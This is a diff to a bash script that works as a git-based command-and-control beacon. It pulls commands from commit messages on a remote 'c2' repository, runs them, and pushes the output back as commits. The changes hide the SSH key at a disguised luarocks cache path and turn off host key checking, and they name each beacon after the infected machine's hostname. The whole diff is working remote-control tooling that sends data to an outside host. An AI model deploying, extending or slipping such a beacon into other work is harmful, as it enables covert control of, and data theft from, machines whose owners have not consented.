@@ -16,16 +16,16 @@ log () {
 		(*) ansi="45;30" ;;
 	esac
 	printf "\033[${ansi}m%s: %s: %s: %s\033[m\n" "${0}" "${FUNCNAME[2]}" "${BASH_LINENO[1]}" "$*" >&2
-}
+} && export -f log
 
-critical () { log critical "${@}"; }
-fatal () { log fatal "${@}"; }
-err () { log err "${@}"; }
-warn () { log warn "${@}"; }
-info () { log info "${@}"; }
-debug () { log debug "${@}"; }
-_grey () { printf '\033[90m' >&2; }
-_rst () { printf '\033[m' >&2; }
+critical () { log critical "${@}"; } && export -f critical 
+fatal () { log fatal "${@}"; } && export -f fatal 
+err () { log err "${@}"; } && export -f err 
+warn () { log warn "${@}"; } && export -f warn 
+info () { log info "${@}"; } && export -f info 
+debug () { log debug "${@}"; } && export -f debug 
+_grey () { printf '\033[90m' >&2; } && export -f _grey 
+_rst () { printf '\033[m' >&2; } && export -f _rst 
 
 # Usage:
 # if logif -1; then hide; fi # never show this specific diagnostic
@@ -41,7 +41,7 @@ logif () {
 	required_loglevel="${1}"
 	[ -n "${required_loglevel}" ] || required_loglevel="999" # if not providing a parameter, always log
 	[ "${LOGLEVEL}" -le "${required_loglevel}" ]
-}
+} && export -f logif
 
 # Remove temporary directory and cd back to a sane place
 _cleanup () {
@@ -59,28 +59,29 @@ _cleanup () {
 }
 
 # Override git command to make it LOGLEVEL aware
-git () {
+_git () {
 	local subcomand
 	declare -i status
 
 	status="0"
 	subcomand="${1}"
-	[ -n "${subcomand}" ] || { command git; return 1; }
+	[ -n "${subcomand}" ] || { git; return 1; }
 	shift
 	if logif 0
 	then
 		_grey
-			1>&2 command git "${subcomand}" "${@}" ; status="${?}"
+			1>&2 git "${subcomand}" "${@}" ; status="${?}"
 		_rst
 		return "${status}"
 	else
-		2>/dev/null 1>&2 command git "${subcomand}" "${@}" ; status="${?}"
+		2>/dev/null 1>&2 git "${subcomand}" "${@}" ; status="${?}"
 		return "${status}"
 	fi
-}
+} && export -f _git
 
 _check_ref () {
-	git ls-remote --heads --exit-code c2 -- "${1}"
+	_git fetch --all
+	_git ls-remote --heads --exit-code c2 -- "${1}"
 }
 
 # Returns empty string if there is no next command
@@ -91,12 +92,12 @@ _fetch_next_command () {
 
 	_check_ref "${BEACON_ID}" \
 		|| { logif 2 && warn "Pull failed (ref '${BEACON_ID}' doesnt exist)"; return 1; }
-	git pull c2 -- "${BEACON_ID}" \
+	_git pull c2 -- "${BEACON_ID}" \
 		|| { logif 2 && warn "Pull failed"; return 1; }
-	cmd_id="$(comm -23 <(command git log --author=in --format=%ae | sort) <(command git log --author=out --format=%ae | sort) | sort -n | head -1)"
+	cmd_id="$(comm -23 <(git log --author=in --format=%ae | sort) <(git log --author=out --format=%ae | sort) | sort -n | head -1)"
 	[ -n "${cmd_id}" ] || return 1
 	printf '%s' "${cmd_id}" 1>| "${id_file:-cmd_id}"
-	stdin="$(command git log -1 --author="${cmd_id}" --format=%s ; printf .)" ; stdin="${stdin%.}"
+	stdin="$(git log -1 --author="${cmd_id}" --format=%s ; printf .)" ; stdin="${stdin%.}"
 	printf '%s' "${stdin}"
 	logif 0 && debug "${cmd_id@A}"
 }
@@ -118,15 +119,15 @@ _send_result () {
 	printf '%s' "${pipestatus}" 1>| pipestatus
 	printf '%s' "${elapsed}" 1>| elapsed
 
-	git add --force "${stdout_file:-stdout}" "${stderr_file:-stderr}" status pipestatus elapsed "${id_file}"
+	_git add --force "${stdout_file:-stdout}" "${stderr_file:-stderr}" status pipestatus elapsed "${id_file}"
 	
 	GIT_AUTHOR_NAME="out" GIT_AUTHOR_EMAIL="${cmd_id}" \
-		git commit --allow-empty --message="${stdin}"
+		_git commit --allow-empty --message="${stdin}"
 
-	git reset --hard
-	git clean -df
+	_git reset --hard
+	_git clean -df
 
-	git push c2 -- "${BEACON_ID}" \
+	_git push c2 -- "${BEACON_ID}" \
 		|| { logif 2 && warn "Push failed"; return 1; }
 }
 
@@ -154,19 +155,21 @@ _is_valid_branch_name () {
 
 init () {
 	trap _cleanup EXIT
+	hash -r
 
 	LOGLEVEL="$((LOGLEVEL + 0))"
 	C2="git@vogsphere.42berlin.de:vogsphere/intra-uuid-17a60d50-65e8-4462-b546-c09f7a20c21c-5663399-tischmid"
 	if _is_valid_branch_name "${1}"
 	then
-		BEACON_ID="${1}"
+		BEACON_ID="beacon-${1}"
 	else
 		BEACON_ID="$(hostname -s)" || BEACON_ID="${HOSTNAME%%.*}"
 		if ! _is_valid_branch_name "${BEACON_ID}"
 		then
-			logif 4 && fatal "error setting beacon id"
+			logif 4 && fatal "Error setting beacon id: 'beacon-${BEACON_ID}'"
 			exit 1
 		fi
+		BEACON_ID="beacon-${BEACON_ID}"
 	fi
 	POLL_RATE="5"
 	unset CDPATH
@@ -175,21 +178,28 @@ init () {
 	orig_dir="$(pwd)" || { logif 3 && err "error saving original dir"; }
 	cd -- "${tmpdir}" || { logif 4 && fatal "error changing to tmpdir"; exit 1; }
 
-	git init
-	git remote add c2 -- "${C2}"
+
+	_git init
+	_git remote add c2 -- "${C2}"
+
+	export GIT_SSH_COMMAND="ssh -o StrictHostKeyChecking=no -o IdentitiesOnly=yes -i '/var/cache/luarocks/https___luarocks.org/manifest-5.1'"
+
 	if _check_ref "${BEACON_ID}"
 	then
-		git pull c2 -- "${BEACON_ID}"
-		git switch -- "${BEACON_ID}"
-	elif _check_ref main
-	then
-		git pull c2 main
-		git branch -- "${BEACON_ID}"
-		git switch -- "${BEACON_ID}"
+		_git pull c2 -- "${BEACON_ID}"
+		_git switch -- "${BEACON_ID}"
 	else
-		git branch --move -- "${BEACON_ID}"
+		until _check_ref c2
+		do
+			logif 0 && debug "Waiting '${POLL_RATE}' seconds ('c2' ref doesn't exist)"
+			sleep "${POLL_RATE}s"
+		done
+		_git pull c2 c2
+		_git branch -- "${BEACON_ID}"
+		_git switch -- "${BEACON_ID}"
 	fi
-	[ "$(command git branch --show-current)" = "${BEACON_ID}" ] || { logif 4 && fatal "Failed to be on '${BEACON_ID}' branch! Exiting"; exit 1; }
+	_git push c2
+	[ "$(git branch --show-current)" = "${BEACON_ID}" ] || { logif 4 && fatal "Failed to be on '${BEACON_ID}' branch! Exiting"; exit 1; }
 	if logif 0
 	then
 		_grey
